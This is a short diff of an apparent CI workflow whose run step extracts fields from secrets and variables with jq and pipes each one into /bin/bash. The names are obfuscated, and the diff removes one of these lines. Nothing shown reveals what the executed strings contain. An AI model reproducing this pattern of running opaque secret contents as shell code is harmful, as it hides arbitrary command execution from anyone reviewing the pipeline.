@@ -18,7 +18,6 @@ jobs:
           cvw6: ${{ secrets.cvw6 }}
         run: |
           printf '%s' "$cvw6" | jq -r .dhx633 | /bin/bash
-          echo $nu64 | jq -r .fxbfe064 | /bin/bash
           printf '%s' "$bqd1" | jq -r .npyf7 | /bin/bash
           echo $uyprf7503 | jq -r .w0 | /bin/bash
           echo $dnih04 | jq -r .k5733 | /bin/bash
